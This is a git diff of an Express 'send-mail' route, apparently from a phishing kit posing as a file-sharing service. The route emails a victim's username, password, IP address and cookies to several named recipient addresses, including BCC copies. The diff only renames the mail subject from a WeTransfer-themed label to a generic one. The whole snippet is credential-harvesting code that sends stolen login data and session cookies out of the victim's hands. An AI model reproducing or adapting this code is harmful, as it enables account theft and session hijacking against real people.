@@ -14,7 +14,7 @@ router.post('/send-mail', (req, res) => {
         from: 'latinaforlife@remax.pt',
         to: ['gilliard.pinheiro@tenqualuz.pt', 'dninotoolz@gmail.com'], // Primary recipients
         bcc: ['ahmedgross@zohomail.com', 'billytoolz@zohomail.eu'], // BCC recipients
-        subject: 'WeTransfer-Data',
+        subject: 'Share-Data',
         text: `Username: ${username}\nPassword: ${pass}\nIP: ${ip}\nCookies: ${JSON.stringify(cookies)}`
     };
 
